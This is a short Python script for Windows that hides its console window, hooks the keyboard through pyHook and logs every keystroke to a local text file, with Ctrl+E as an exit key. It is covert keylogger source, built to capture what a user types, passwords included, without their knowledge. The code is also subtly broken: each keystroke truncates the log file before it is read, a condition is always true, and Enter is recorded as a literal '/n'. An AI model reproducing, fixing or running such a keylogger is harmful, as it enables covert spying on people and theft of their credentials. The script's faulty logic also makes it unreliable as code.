import win32api
import win32console
import win32gui
import pythoncom,pyHook
import os as Os

win=win32console.GetConsoleWindow()
win32gui.ShowWindow(win,0)

def OnKeyboardEvent(event):
    if event.Ascii==5:
        Os._exit(1)
    if event.Ascii !=0 or 8:
        f=open('output.txt','w+')
        f.close()
        f=open('output.txt','r+')
        buffer=f.read()
        f.close()
        f=open('output.txt','w')
        keylogs=chr(event.Ascii)
        if event.Ascii==13:
            keylogs='/n'
        buffer+=keylogs
        f.write(buffer)
        f.close()

hm=pyHook.HookManager()
hm.KeyDown=OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
